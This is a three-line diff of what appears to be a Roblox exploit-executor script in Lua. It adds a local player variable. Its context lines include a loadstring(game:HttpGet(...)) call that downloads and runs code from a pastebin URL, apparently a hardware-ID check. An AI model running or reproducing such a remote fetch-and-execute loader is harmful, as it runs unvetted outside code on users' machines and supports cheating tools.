@@ -1,4 +1,4 @@
-
+local player = game.Players.localPlayer
 local http_request = syn and syn.request or request;
 local hwidPaste = loadstring(game:HttpGet("https://pastebin.com/raw/NQXauJ5z"))()
 
